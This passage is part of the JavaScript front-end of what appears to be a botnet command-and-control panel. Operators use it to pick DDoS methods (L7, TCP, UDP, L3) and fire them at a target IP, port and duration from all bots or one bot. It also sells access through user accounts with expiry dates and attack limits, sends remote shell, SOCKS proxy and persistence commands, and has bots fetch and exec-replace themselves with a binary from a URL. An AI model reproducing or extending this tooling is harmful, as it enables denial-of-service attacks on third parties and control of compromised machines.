      return sortAsc ? va - vb : vb - va;
    }
    // Boolean fields
    if (typeof va === 'boolean') {
      return sortAsc ? (va === vb ? 0 : va ? -1 : 1) : (va === vb ? 0 : va ? 1 : -1);
    }
    // String fields
    va = String(va || '').toLowerCase();
    vb = String(vb || '').toLowerCase();
    if (va < vb) return sortAsc ? -1 : 1;
    if (va > vb) return sortAsc ? 1 : -1;
    return 0;
  });

  // Re-order DOM rows
  var tbody = document.getElementById('bot-tbody');
  bots.forEach(function (b) {
    var row = document.getElementById('bot-' + sanitizeId(b.botID));
    if (row) tbody.appendChild(row);
  });

  // Update order tracking
  botOrder = bots.map(function (b) { return b.botID; });
  window._botsArr = bots;
  lsSet('sort', { field: sortField, asc: sortAsc });
}

// ---------------------------------------------------------------------------
// Compact Mode
// ---------------------------------------------------------------------------

var compactMode = false;

function refreshAll() {
  fetch('/api/stats').then(function (r) { return r.json(); }).then(updateStats).catch(function () { });
  fetch('/api/bots').then(function (r) { return r.json(); }).then(updateBots).catch(function () { });
  fetch('/api/activity').then(function (r) { return r.json(); }).then(function (entries) { renderActivityFull(entries); }).catch(function () { });
  showToast('Refreshed', true);
}

function toggleCompactMode() {
  compactMode = !compactMode;
  var wrap = document.getElementById('bot-table-wrap');
  var btn = document.getElementById('compact-toggle');
  if (compactMode) { wrap.classList.add('compact'); btn.classList.add('active'); }
  else { wrap.classList.remove('compact'); btn.classList.remove('active'); }
  lsSet('compact', compactMode);
}

// ---------------------------------------------------------------------------
// Command Bar Toggle
// ---------------------------------------------------------------------------

function toggleCmdBar() {
  var bar = document.getElementById('cmd-bar');
  bar.classList.toggle('collapsed');
  lsSet('cmdCollapsed', bar.classList.contains('collapsed'));
}

// ---------------------------------------------------------------------------
// Command Category Filter
// ---------------------------------------------------------------------------
function switchCmdCat(btn) {
  var cats = document.querySelectorAll('.cmd-cat');
  cats.forEach(function (c) { c.classList.remove('active'); });
  btn.classList.add('active');
  var cat = btn.getAttribute('data-cat');
  var sel = document.getElementById('cmd-type');
  var opts = sel.options;
  var firstVisible = null;
  for (var i = 0; i < opts.length; i++) {
    var oc = opts[i].getAttribute('data-cat');
    if (oc === cat) {
      opts[i].style.display = '';
      if (!firstVisible) firstVisible = opts[i];
    } else {
      opts[i].style.display = 'none';
    }
  }
  // select first visible if current selection is hidden
  if (sel.options[sel.selectedIndex].style.display === 'none' && firstVisible) {
    sel.value = firstVisible.value;
  }
  updateArgFields();
}

function clearCmdTarget() {
  var inp = document.getElementById('cmd-bot');
  inp.value = '';
  inp.placeholder = 'all bots';
  document.getElementById('cmd-target-clear').style.display = 'none';
}

function targetBot(botID) {
  var bar = document.getElementById('cmd-bar');
  if (bar.classList.contains('collapsed')) { toggleCmdBar(); }
  var inp = document.getElementById('cmd-bot');
  inp.value = botID;
  document.getElementById('cmd-target-clear').style.display = '';
  inp.classList.add('cmd-target-flash');
  setTimeout(function () { inp.classList.remove('cmd-target-flash'); }, 600);
  showToast('Targeting ' + botID, true);
}

// init category filter on load
document.addEventListener('DOMContentLoaded', function () {
  var first = document.querySelector('.cmd-cat.active');
  if (first) switchCmdCat(first);
});

// ---------------------------------------------------------------------------
// Group Stats Card
// ---------------------------------------------------------------------------

function updateGroupStats() {
  if (!window._botsArr || !window._botsArr.length) {
    document.getElementById('s-groups-card').style.display = 'none';
    return;
  }
  var groups = {};
  window._botsArr.forEach(function (b) {
    if (b.group) groups[b.group] = (groups[b.group] || 0) + 1;
  });
  var card = document.getElementById('s-groups-card');
  var wrap = document.getElementById('s-groups');
  if (!Object.keys(groups).length) { card.style.display = 'none'; return; }
  card.style.display = '';
  wrap.innerHTML = '';
  Object.entries(groups).forEach(function (e) {
    var c = groupColors[groupColorIndex(e[0])];
    var s = document.createElement('span');
    s.className = 'arch-pill';
    s.style.cssText = 'background:' + c.bg + ';color:' + c.fg + ';border-color:' + c.border;
    s.textContent = e[0] + ': ' + e[1];
    wrap.appendChild(s);
  });
}

// ---------------------------------------------------------------------------
// Attack Panel
// ---------------------------------------------------------------------------

var atkMethods = [];

function loadAttackMethods() {
  fetch('/api/attack-methods').then(function (r) { return r.json(); }).then(function (methods) {
    atkMethods = methods;
    var l7Grp = document.getElementById('atk-l7-group');
    var tcpGrp = document.getElementById('atk-tcp-group');
    var udpGrp = document.getElementById('atk-udp-group');
    var l3Grp = document.getElementById('atk-l3-group');
    if (!udpGrp) return;
    l7Grp.innerHTML = ''; tcpGrp.innerHTML = ''; udpGrp.innerHTML = ''; l3Grp.innerHTML = '';
    methods.forEach(function (m) {
      var opt = document.createElement('option');
      opt.value = m.id;
      opt.textContent = m.name;
      if (m.category === 'l7') l7Grp.appendChild(opt);
      else if (m.category === 'tcp') tcpGrp.appendChild(opt);
      else if (m.category === 'udp') udpGrp.appendChild(opt);
      else l3Grp.appendChild(opt);
    });
    updateAtkMethodInfo();
  }).catch(function () { });
}

function updateAtkMethodInfo() {
  var sel = document.getElementById('atk-method');
  var desc = document.getElementById('atk-desc');
  var optsDiv = document.getElementById('atk-opts');
  if (!sel || !desc) return;
  var id = sel.value;
  var m = atkMethods.find(function (x) { return x.id === id; });
  desc.textContent = m ? m.category.toUpperCase() + ' | ' + m.desc : '';

  // rebuild advanced options for this method
  if (!optsDiv) return;
  optsDiv.innerHTML = '';
  if (!m || !m.options || m.options.length === 0) {
    optsDiv.innerHTML = '<div style="opacity:0.5;padding:8px">No advanced options for this method</div>';
    return;
  }
  m.options.forEach(function (o) {
    var div = document.createElement('div');
    div.className = 'atk-opt';
    if (o.tooltip) div.setAttribute('title', o.tooltip);
    var lbl = document.createElement('label');
    lbl.textContent = o.label;
    if (o.tooltip) {
      var hint = document.createElement('span');
      hint.className = 'atk-opt-hint';
      hint.textContent = '?';
      hint.setAttribute('title', o.tooltip);
      lbl.appendChild(hint);
    }
    var inp = document.createElement('input');
    inp.type = 'text';
    inp.id = 'atk-opt-' + o.key;
    inp.placeholder = o.default !== undefined && o.default !== '' ? o.default : '\u2014';
    inp.value = o.default || '';
    inp.setAttribute('data-key', o.key);
    inp.setAttribute('data-default', o.default || '');
    inp.setAttribute('autocomplete', 'off');
    div.appendChild(lbl);
    div.appendChild(inp);
    optsDiv.appendChild(div);
  });
}

function toggleAtkAdvanced() {
  var adv = document.getElementById('atk-advanced');
  adv.style.display = adv.style.display === 'none' ? '' : 'none';
}

// ---------------------------------------------------------------------------
// Custom confirm modal (replaces native confirm() dialogs)
// opts: { title, message, details: [{label,val}], icon:'danger'|'warn',
//         confirmText, confirmClass:'danger'|'warn', onConfirm }
// ---------------------------------------------------------------------------
function showConfirm(opts) {
  var old = document.getElementById('confirm-overlay');
  if (old) old.remove();

  var detailsHtml = '';
  if (opts.details && opts.details.length) {
    detailsHtml = '<div class="confirm-details">';
    opts.details.forEach(function (d) {
      detailsHtml += '<span class="cd-label">' + escHtml(d.label) + '</span>';
      detailsHtml += '<span class="cd-val">' + escHtml(d.val) + '</span>';
    });
    detailsHtml += '</div>';
  }

  var iconClass = opts.icon || 'danger';
  var iconChar = iconClass === 'warn' ? '\u26A0' : '\u26A1';
  var btnClass = opts.confirmClass || 'danger';

  var overlay = document.createElement('div');
  overlay.id = 'confirm-overlay';
  overlay.className = 'confirm-overlay';
  overlay.innerHTML =
    '<div class="confirm-box">' +
    '<div class="confirm-header">' +
    '<div class="confirm-icon ' + iconClass + '">' + iconChar + '</div>' +
    '<div class="confirm-title">' + escHtml(opts.title || 'Confirm') + '</div>' +
    '</div>' +
    '<div class="confirm-body">' +
    '<div class="confirm-msg">' + escHtml(opts.message || '') + '</div>' +
    detailsHtml +
    '</div>' +
    '<div class="confirm-footer">' +
    '<button class="confirm-btn confirm-btn-cancel" id="confirm-cancel">Cancel</button>' +
    '<button class="confirm-btn confirm-btn-' + btnClass + '" id="confirm-ok">' +
    escHtml(opts.confirmText || 'Confirm') +
    '</button>' +
    '</div>' +
    '</div>';

  document.body.appendChild(overlay);
  requestAnimationFrame(function () { overlay.classList.add('open'); });

  function close() {
    overlay.classList.remove('open');
    setTimeout(function () { overlay.remove(); }, 160);
  }

  document.getElementById('confirm-cancel').onclick = close;
  overlay.addEventListener('click', function (e) { if (e.target === overlay) close(); });
  document.getElementById('confirm-ok').onclick = function () {
    close();
    if (opts.onConfirm) opts.onConfirm();
  };

  // Esc key
  function onKey(e) { if (e.key === 'Escape') { close(); document.removeEventListener('keydown', onKey); } }
  document.addEventListener('keydown', onKey);
}

// showUrlInput — like showConfirm but includes a URL text field.
// opts: { title, message, placeholder, required, confirmText, icon, onConfirm(url) }
function showUrlInput(opts) {
  var old = document.getElementById('confirm-overlay');
  if (old) old.remove();

  var iconClass = opts.icon || 'warn';
  var iconChar = iconClass === 'warn' ? '\u26A0' : '\u2193';
  var btnClass = opts.confirmClass || 'ok';
  var inputId = 'url-input-field';

  var overlay = document.createElement('div');
  overlay.id = 'confirm-overlay';
  overlay.className = 'confirm-overlay';
  overlay.innerHTML =
    '<div class="confirm-box">' +
    '<div class="confirm-header">' +
    '<div class="confirm-icon ' + iconClass + '">' + iconChar + '</div>' +
    '<div class="confirm-title">' + escHtml(opts.title || 'Enter URL') + '</div>' +
    '</div>' +
    '<div class="confirm-body">' +
    '<div class="confirm-msg">' + escHtml(opts.message || '') + '</div>' +
    '<input id="' + inputId + '" class="confirm-url-input" type="text" ' +
      'placeholder="' + escHtml(opts.placeholder || 'https://') + '" autocomplete="off" spellcheck="false">' +
    '</div>' +
    '<div class="confirm-footer">' +
    '<button class="confirm-btn confirm-btn-cancel" id="confirm-cancel">Cancel</button>' +
    '<button class="confirm-btn confirm-btn-' + btnClass + '" id="confirm-ok">' +
    escHtml(opts.confirmText || 'Send') +
    '</button>' +
    '</div>' +
    '</div>';

  document.body.appendChild(overlay);
  requestAnimationFrame(function () {
    overlay.classList.add('open');
    document.getElementById(inputId).focus();
  });

  function close() {
    overlay.classList.remove('open');
    setTimeout(function () { overlay.remove(); }, 160);
  }

  function submit() {
    var url = document.getElementById(inputId).value.trim();
    if (opts.required && !url) {
      document.getElementById(inputId).style.borderColor = 'var(--red)';
      document.getElementById(inputId).focus();
      return;
    }
    close();
    if (opts.onConfirm) opts.onConfirm(url);
  }

  document.getElementById('confirm-cancel').onclick = close;
  overlay.addEventListener('click', function (e) { if (e.target === overlay) close(); });
  document.getElementById('confirm-ok').onclick = submit;
  document.getElementById(inputId).addEventListener('keydown', function (e) {
    if (e.key === 'Enter') submit();
    if (e.key === 'Escape') close();
  });
  function onKey(e) { if (e.key === 'Escape') { close(); document.removeEventListener('keydown', onKey); } }
  document.addEventListener('keydown', onKey);
}

function popupPersist(botID) {
  showUrlInput({
    title: 'Persist',
    message: 'Optional: URL to fetch binary/script as fallback if the bot\'s binary is unreadable on disk. Leave blank to copy the running binary.',
    placeholder: 'https://host/bot.elf  (optional)',
    required: false,
    confirmText: 'Persist',
    icon: 'warn',
    confirmClass: 'ok',
    onConfirm: function (url) {
      popupCmd(botID, url ? '!persist ' + url : '!persist');
    }
  });
}

function popupReinstall(botID) {
  showUrlInput({
    title: 'Reinstall',
    message: 'URL of ELF binary or shell script to fetch. The bot will download it, write to a temp file, and exec-replace itself.',
    placeholder: 'https://host/bot.elf',
    required: true,
    confirmText: 'Reinstall',
    icon: 'warn',
    confirmClass: 'danger',
    onConfirm: function (url) {
      popupCmd(botID, '!reinstall ' + url);
    }
  });
}

function fireAttack() {
  var method = document.getElementById('atk-method').value;
  var target = document.getElementById('atk-target').value.trim();
  var port = document.getElementById('atk-port').value.trim() || '80';
  var duration = document.getElementById('atk-duration').value.trim() || '30';
  var botID = document.getElementById('atk-bot').value.trim();

  if (!target) { showToast('Enter a target IP', false); return; }
  if (!method) { showToast('Select a method', false); return; }

  // Build command: !method target port duration [key=val ...]
  var cmd = '!' + method + ' ' + target + ' ' + port + ' ' + duration;

  // Gather advanced options dynamically from rendered fields (skip defaults)
  var optInputs = document.querySelectorAll('#atk-opts input[data-key]');
  optInputs.forEach(function (inp) {
    var val = inp.value.trim();
    var def = inp.getAttribute('data-default') || '';
    if (val && val !== def) cmd += ' ' + inp.getAttribute('data-key') + '=' + val;
  });

  var m = atkMethods.find(function (x) { return x.id === method; });
  var mName = m ? m.name : method;
  var scope = botID ? 'Bot: ' + botID : 'ALL bots';

  showConfirm({
    title: 'Launch Attack',
    message: 'You are about to fire an attack with the following parameters:',
    icon: 'danger',
    details: [
      { label: 'Method', val: mName },
      { label: 'Target', val: target + ':' + port },
      { label: 'Duration', val: duration + 's' },
      { label: 'Scope', val: scope }
    ],
    confirmText: 'Fire',
    confirmClass: 'danger',
    onConfirm: function () {
      fetch('/api/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: cmd, botID: botID })
      })
        .then(function (r) { return r.json(); })
        .then(function (d) { showToast(d.message, d.success); })
        .catch(function () { showToast('Attack request failed', false); });
    }
  });
}

function stopAttack() {
  var botID = document.getElementById('atk-bot').value.trim();
  var scope = botID || 'ALL bots';

  showConfirm({
    title: 'Stop Attacks',
    message: 'This will immediately stop all running attacks.',
    icon: 'warn',
    details: [
      { label: 'Scope', val: scope }
    ],
    confirmText: 'Stop All',
    confirmClass: 'warn',
    onConfirm: function () {
      fetch('/api/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: '!stop', botID: botID })
      })
        .then(function (r) { return r.json(); })
        .then(function (d) { showToast(d.message, d.success); })
        .catch(function () { showToast('Stop request failed', false); });
    }
  });
}

// ---------------------------------------------------------------------------
// Users Management
// ---------------------------------------------------------------------------

var usersData = [];

function loadUsers() {
  fetch('/api/users').then(function (r) { return r.json(); }).then(function (users) {
    usersData = users;
    renderUserCards(users);
  }).catch(function () { showToast('Failed to load users', false); });
}

function renderUserCards(users) {
  var grid = document.getElementById('users-grid');
  if (!users || !users.length) {
    grid.innerHTML = '<div class="no-bots">No users found</div>';
    return;
  }
  grid.innerHTML = users.map(function (u) {
    var expired = new Date(u.expire) < new Date();
    var levelClass = 'ul-' + u.level.toLowerCase();
    var botsStr = u.maxbots > 0 ? u.maxbots : 'all';
    var methods = (u.methods || []).join(', ') || 'none';
    return '<div class="user-card' + (expired ? ' user-expired' : '') + '">' +
      '<div class="uc-header">' +
      '<span class="uc-name">' + escHtml(u.username) + '</span>' +
      '<span class="uc-level ' + levelClass + '">' + escHtml(u.level) + '</span>' +
      '</div>' +
      '<div class="uc-body">' +
      '<div class="uc-field"><span class="uc-label">Password</span><span class="uc-val">' + escHtml(u.password) + '</span></div>' +
      '<div class="uc-field"><span class="uc-label">Expires</span><span class="uc-val' + (expired ? ' uc-expired' : '') + '">' + escHtml(u.expire) + (expired ? ' (expired)' : '') + '</span></div>' +
      '<div class="uc-field"><span class="uc-label">Max Time</span><span class="uc-val">' + u.maxtime + 's</span></div>' +
      '<div class="uc-field"><span class="uc-label">Concurrents</span><span class="uc-val">' + u.concurrents + '</span></div>' +
      '<div class="uc-field"><span class="uc-label">Max Bots</span><span class="uc-val">' + botsStr + '</span></div>' +
      '<div class="uc-field uc-field-full"><span class="uc-label">Methods</span><span class="uc-val uc-methods">' + escHtml(methods) + '</span></div>' +
      '</div>' +
      '<div class="uc-actions">' +
      '<button class="uc-btn uc-edit" onclick="editUser(\'' + escHtml(u.username) + '\')">Edit</button>' +
      '<button class="uc-btn uc-delete" onclick="deleteUser(\'' + escHtml(u.username) + '\')">Delete</button>' +
      '</div>' +
      '</div>';
  }).join('');
}

function showAddUserForm() {
  document.getElementById('user-form-title').textContent = 'Add User';
  document.getElementById('uf-editing').value = '';
  document.getElementById('uf-username').value = '';
  document.getElementById('uf-username').disabled = false;
  document.getElementById('uf-password').value = '';
  document.getElementById('uf-level').value = 'Basic';
  var d = new Date(); d.setMonth(d.getMonth() + 1);
  document.getElementById('uf-expire').value = d.toISOString().split('T')[0];
  document.getElementById('uf-maxtime').value = '300';
  document.getElementById('uf-concurrents').value = '1';
  document.getElementById('uf-maxbots').value = '0';
  document.getElementById('uf-methods').value = 'udpplain,syn,ack';
  document.getElementById('users-form-wrap').style.display = '';
}

function editUser(username) {
  var u = usersData.find(function (x) { return x.username === username; });
  if (!u) return;
  document.getElementById('user-form-title').textContent = 'Edit User';
  document.getElementById('uf-editing').value = username;
  document.getElementById('uf-username').value = u.username;
  document.getElementById('uf-username').disabled = true;
  document.getElementById('uf-password').value = u.password;
  document.getElementById('uf-level').value = u.level;
  document.getElementById('uf-expire').value = u.expire;
  document.getElementById('uf-maxtime').value = u.maxtime;
  document.getElementById('uf-concurrents').value = u.concurrents;
  document.getElementById('uf-maxbots').value = u.maxbots;
  document.getElementById('uf-methods').value = (u.methods || []).join(',');
  document.getElementById('users-form-wrap').style.display = '';
}

function hideUserForm() {
  document.getElementById('users-form-wrap').style.display = 'none';
}

function saveUser() {
  var editing = document.getElementById('uf-editing').value;
  var username = document.getElementById('uf-username').value.trim();
  var password = document.getElementById('uf-password').value.trim();
  var level = document.getElementById('uf-level').value;
  var expire = document.getElementById('uf-expire').value;
  var maxtime = parseInt(document.getElementById('uf-maxtime').value) || 300;
  var concurrents = parseInt(document.getElementById('uf-concurrents').value) || 1;
  var maxbots = parseInt(document.getElementById('uf-maxbots').value) || 0;
  var methodsStr = document.getElementById('uf-methods').value.trim();
  var methods = methodsStr ? methodsStr.split(',').map(function (m) { return m.trim(); }).filter(Boolean) : [];

  if (!username || !password) {
    showToast('Username and password required', false);
    return;
  }

  var payload = {
    username: username,
    password: password,
    level: level,
    expire: expire,
    maxtime: maxtime,
    concurrents: concurrents,
    maxbots: maxbots,
    methods: methods
  };

  var method = editing ? 'PUT' : 'POST';
  fetch('/api/users', {
    method: method,
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d.success) {
        showToast(editing ? 'User updated' : 'User created', true);
        hideUserForm();
        loadUsers();
      } else {
        showToast(d.error || 'Failed', false);
      }
    })
    .catch(function () { showToast('Request failed', false); });
}

function deleteUser(username) {
  if (!confirm('Delete user "' + username + '"?')) return;
  fetch('/api/users', {
    method: 'DELETE',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: username })
  })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d.success) {
        showToast('User deleted', true);
        loadUsers();
      } else {
        showToast(d.error || 'Failed', false);
      }
    })
    .catch(function () { showToast('Delete failed', false); });
}

// ---------------------------------------------------------------------------
// Theme toggle
// ---------------------------------------------------------------------------

var _globalThemeProps = ['--bg-base','--bg-primary','--bg-card','--bg-card-hover','--bg-input',
  '--bg-elevated','--border','--border-light','--text','--text-muted','--text-dim',
  '--accent','--accent-hover','--green','--red','--yellow','--blue','--cyan','--header-bg'];

function clearGlobalThemeVars() {
  var r = document.documentElement;
  _globalThemeProps.forEach(function (p) { r.style.removeProperty(p); });
  document.body.style.background = '';
  try { localStorage.removeItem('vision_global_theme'); } catch (e) {}
  var picker = document.getElementById('global-theme-picker');
  if (picker) picker.value = '';
}

function applyTheme(theme) {
  clearGlobalThemeVars();
  document.documentElement.setAttribute('data-theme', theme);
  var btn = document.getElementById('theme-toggle');
  if (btn) {
    btn.querySelector('.sun').style.display = theme === 'dark' ? 'none' : 'block';
    btn.querySelector('.moon').style.display = theme === 'dark' ? 'block' : 'none';
  }
  // Keep the picker in sync — 'light' and 'dark' are direct keys in GLOBAL_THEMES.
  var picker = document.getElementById('global-theme-picker');
  if (picker) picker.value = theme;
}

function toggleTheme() {
  var current = document.documentElement.getAttribute('data-theme') || 'dark';
  var next = current === 'dark' ? 'light' : 'dark';
  applyTheme(next);
  try { localStorage.setItem('vision-theme', next); } catch (e) { }
}

// ---------------------------------------------------------------------------
// Initialization
// ---------------------------------------------------------------------------

(function () {
  var saved = 'dark';
  try { saved = localStorage.getItem('vision-theme') || 'dark'; } catch (e) { }
  applyTheme(saved);
})();

updateArgFields();
updateTaskArgFields();
loadAttackMethods();

// Restore persisted UI state
(function () {
  // Compact mode
  if (lsGet('compact', false)) { toggleCompactMode(); }
  // Active tab
  var savedTab = lsGet('tab', null);
  if (savedTab) { var tb = document.querySelector('[data-tab="' + savedTab + '"]'); if (tb) switchTab(tb); }
  // Command bar collapsed
  if (lsGet('cmdCollapsed', false)) { toggleCmdBar(); }
  // Filters
  var savedFilters = lsGet('filters', null);
  if (savedFilters) { activeFilters = savedFilters; }
  // Search query
  var savedSearch = lsGet('search', '');
  if (savedSearch) { document.getElementById('bot-search').value = savedSearch; }
  // Notifications
  notifHistory = lsGet('notifs', []);
  notifUnseen = 0;
  renderNotifList();
})();

fetch('/api/stats').then(function (r) { return r.json(); }).then(updateStats).catch(function () { });
fetch('/api/bots').then(function (r) { return r.json(); }).then(function (bots) {
  updateBots(bots);
  // Restore sort after first bot load
  var savedSort = lsGet('sort', null);
  if (savedSort && savedSort.field) {
    sortField = savedSort.field;
    sortAsc = !savedSort.asc; // sortBots toggles, so invert
    sortBots(savedSort.field);
  }
}).catch(function () { });
fetch('/api/activity').then(function (r) { return r.json(); }).then(function (entries) { renderActivityFull(entries); }).catch(function () { });
connectSSE();

// Refresh health indicators every 10s (ago text + health dots go stale between SSE updates)
setInterval(function () {
  document.querySelectorAll('#bot-tbody tr.bot-row').forEach(function (r) {
    var id = r.getAttribute('data-botid');
    var b = botState[id]; if (!b) return;
    var cells = r.getElementsByTagName('td');
    if (cells.length < 13) return;
    var h = botHealth(b.lastPing);
    cells[12].className = h.cls;
    cells[12].innerHTML = '<span class="health-dot ' + h.dot + '"></span>' + ago(b.lastPing);
    r.className = 'bot-row ' + h.row;
  });
}, 10000);

// === Live Attacks ===
function loadLiveAttacks() {
  fetch('/api/attacks').then(function(r){return r.json();}).then(function(attacks) {
    var list = document.getElementById('live-attacks-list');
    var count = document.getElementById('live-attacks-count');
    if (!list) return;
    count.textContent = attacks.length;
    if (!attacks.length) {
      list.innerHTML = '<div style="color:var(--text-dim);padding:12px;font-size:13px">No active attacks</div>';
      return;
    }
    list.innerHTML = attacks.map(function(a) {
      var pct = a.duration > 0 ? Math.round((a.elapsed / a.duration) * 100) : 0;
      return '<div class="live-atk-row">' +
        '<span class="live-atk-method">' + escHtml(a.method) + '</span>' +
        '<span class="live-atk-target">' + escHtml(a.target) + ':' + escHtml(String(a.port)) + '</span>' +
        '<div class="live-atk-bar"><div class="live-atk-bar-fill" style="width:' + pct + '%"></div></div>' +
        '<span class="live-atk-time">' + a.remaining + 's</span>' +
        '</div>';
    }).join('');
  }).catch(function(){});
}
setInterval(loadLiveAttacks, 2000);
loadLiveAttacks();

// Relay stats — refresh every 15s in background
setInterval(loadRelayStats, 15000);
loadRelayStats();

// ===========================================================================
// TASKS
// ===========================================================================
function loadTasks() {
  fetch('/api/tasks').then(function(r){return r.json();}).then(function(tasks) {
    var wrap = document.getElementById('task-table-wrap');
    var count = document.getElementById('task-active-count');
    var tabCount = document.getElementById('tab-tasks-count');
    if (count) count.textContent = tasks.length;
    if (tabCount) tabCount.textContent = tasks.length;
    if (!tasks.length) {
      wrap.innerHTML = '<div class="task-empty">No active tasks</div>';
      return;
    }
    var html = '<table class="task-table"><thead><tr><th>#</th><th>Command</th><th>Target</th><th>Status</th><th>Result</th><th>Time</th></tr></thead><tbody>';
    tasks.forEach(function(t) {
      var statusClass = t.status === 'sent' ? 'ok' : t.status === 'failed' ? 'err' : '';
      var time = t.createdAt ? new Date(t.createdAt).toLocaleTimeString() : '';
      html += '<tr><td>' + t.id + '</td><td style="font-weight:600">' + escHtml(t.command) + '</td><td>' + escHtml(t.botID || 'ALL') + '</td><td class="' + statusClass + '">' + escHtml(t.status) + '</td><td>' + escHtml(t.result) + '</td><td>' + time + '</td></tr>';
    });
    html += '</tbody></table>';
    wrap.innerHTML = html;
  }).catch(function(){});
}

function addTask() {
  var cmd = document.getElementById('task-type').value;
  var argsEl = document.getElementById('task-arg-fields');
  var inputs = argsEl ? argsEl.querySelectorAll('input') : [];
  var args = [];
  inputs.forEach(function(el) { if (el.value.trim()) args.push(el.value.trim()); });
  var full = cmd + (args.length ? ' ' + args.join(' ') : '');
  fetch('/api/tasks', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({command: full, botID: ''})
  }).then(function(r){return r.json();}).then(function(d) {
    if (d.success) { showToast('Task created: ' + (d.task.result || ''), true); loadTasks(); }
    else showToast(d.message || 'Failed', false);
  }).catch(function(){ showToast('Request failed', false); });
}

function updateTaskArgFields() {
  var cmd = document.getElementById('task-type').value;
  var container = document.getElementById('task-arg-fields');
  if (!container) return;
  var fields = {
    '!shell': [{placeholder:'command to run', style:'flex:1'}],
    '!detach': [{placeholder:'command to run in background', style:'flex:1'}],
    '!socks': [{placeholder:'relay address (optional)'}],
    '!stopsocks': [],
    '!socksauth': [{placeholder:'username'}, {placeholder:'password'}],
    '!persist': [],
    '!lolnogtfo': []
  };
  var f = fields[cmd] || [];
  if (!f.length) { container.innerHTML = '<span style="color:var(--text-dim);font-size:12px">No arguments</span>'; return; }
  container.innerHTML = f.map(function(a) {
    return '<input type="text" placeholder="' + (a.placeholder||'') + '" style="' + (a.style||'') + '" autocomplete="off" spellcheck="false">';
  }).join('');
}
updateTaskArgFields();

// ===========================================================================
// ATTACK BUILDER WIZARD
// ===========================================================================
var wizState = { step: 1, method: null, methods: [] };

function wizardInit() {
  fetch('/api/attack-methods').then(function(r) { return r.json(); }).then(function(methods) {
    wizState.methods = methods;
    var grid = document.getElementById('wiz-method-grid');
    if (!grid) return;
    grid.innerHTML = '';
    methods.forEach(function(m) {
      var card = document.createElement('div');
      card.className = 'method-card';
      card.innerHTML = '<div class="mc-name">' + escHtml(m.name) + '</div><div class="mc-cat">' + escHtml(m.category) + '</div><div class="mc-desc">' + escHtml(m.desc) + '</div>';
      card.onclick = function() {
        wizState.method = m;
        grid.querySelectorAll('.method-card').forEach(function(c) { c.classList.remove('selected'); });
        card.classList.add('selected');
      };
      grid.appendChild(card);
    });
  }).catch(function() {});
}

function wizardNext() {
  if (wizState.step === 1 && !wizState.method) { showToast('Select a method', false); return; }
  if (wizState.step === 2) {
    var t = document.getElementById('wiz-target').value.trim();
    if (!t) { showToast('Enter a target IP', false); return; }
  }
  wizState.step = Math.min(wizState.step + 1, 3);
  renderWizStep();
  if (wizState.step === 3) renderWizReview();
}

function wizardBack() { wizState.step = Math.max(wizState.step - 1, 1); renderWizStep(); }

function renderWizStep() {
  for (var i = 1; i <= 3; i++) {
    var p = document.getElementById('wiz-step-' + i);
    if (p) p.classList.toggle('active', i === wizState.step);
  }
  document.querySelectorAll('.wizard-step').forEach(function(el) {
    var s = parseInt(el.getAttribute('data-step'));
    el.classList.toggle('active', s === wizState.step);
    el.classList.toggle('done', s < wizState.step);
  });
  var b = document.getElementById('wiz-back'), n = document.getElementById('wiz-next'), l = document.getElementById('wiz-launch');
  if (b) b.style.display = wizState.step > 1 ? '' : 'none';
  if (n) n.style.display = wizState.step < 3 ? '' : 'none';
  if (l) l.style.display = wizState.step === 3 ? '' : 'none';
}

function renderWizReview() {
  var r = document.getElementById('wiz-review'); if (!r) return;
  var target = document.getElementById('wiz-target').value.trim();
  var port = document.getElementById('wiz-port').value.trim() || '80';
  var dur = parseInt(document.getElementById('wiz-duration-val').value) || 120;
  var bot = (document.getElementById('wiz-bot-target') || {}).value || '';
  var html = '<div class="wr-row"><span class="wr-label">Method</span><span class="wr-value">' + escHtml(wizState.method.name) + '</span></div>' +
    '<div class="wr-row"><span class="wr-label">Target</span><span class="wr-value">' + escHtml(target) + ':' + escHtml(port) + '</span></div>' +
    '<div class="wr-row"><span class="wr-label">Duration</span><span class="wr-value">' + dur + 's</span></div>' +
    '<div class="wr-row"><span class="wr-label">Scope</span><span class="wr-value">' + (bot || 'ALL bots') + '</span></div>';
  r.innerHTML = html;
}

function wizardLaunch() {
  var target = document.getElementById('wiz-target').value.trim();
  var port = document.getElementById('wiz-port').value.trim() || '80';
  var dur = document.getElementById('wiz-duration-val').value || '120';
  var bot = (document.getElementById('wiz-bot-target') || {}).value || '';
  var cmd = '!' + wizState.method.id + ' ' + target + ' ' + port + ' ' + dur;
  fetch('/api/command', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ command: cmd, botID: bot })
  }).then(function(r) { return r.json(); }).then(function(d) {
    if (d.success) { showToast('Attack launched: ' + d.message, true); wizState.step = 1; wizState.method = null; renderWizStep(); wizardInit(); }
    else showToast(d.message || 'Failed', false);
  }).catch(function() { showToast('Request failed', false); });
}

wizardInit();

// ===========================================================================
// GLOBAL PANEL THEMES
// ===========================================================================
var GLOBAL_THEMES = {
  light:     { name:'Light',           _dataTheme:'light' },
  dark:      { name:'Dark',            _dataTheme:'dark' },
  default:   { name:'Default (Dark)',  bgBase:'#06080c', bgPrimary:'#0c1018', bgCard:'#111827', bgCardHover:'#1a2332', bgInput:'#0f1520', bgElevated:'#182234', border:'#1e2d3d', borderLight:'#253344', text:'#e2e8f0', textMuted:'#64748b', textDim:'#475569', accent:'#8b5cf6', accentHover:'#7c3aed', green:'#22c55e', red:'#ef4444', yellow:'#eab308', blue:'#3b82f6', cyan:'#06b6d4', headerBg:'rgba(12,16,24,0.8)' },
  monokai:   { name:'Monokai',         bgBase:'#1a1a17', bgPrimary:'#272822', bgCard:'#2e2f28', bgCardHover:'#3a3b32', bgInput:'#1e1f1a', bgElevated:'#3e3d32', border:'#49483e', borderLight:'#5a5949', text:'#f8f8f2', textMuted:'#a59f85', textDim:'#75715e', accent:'#f92672', accentHover:'#e6195f', green:'#a6e22e', red:'#f92672', yellow:'#e6db74', blue:'#66d9ef', cyan:'#a1efe4', headerBg:'rgba(39,40,34,0.9)' },
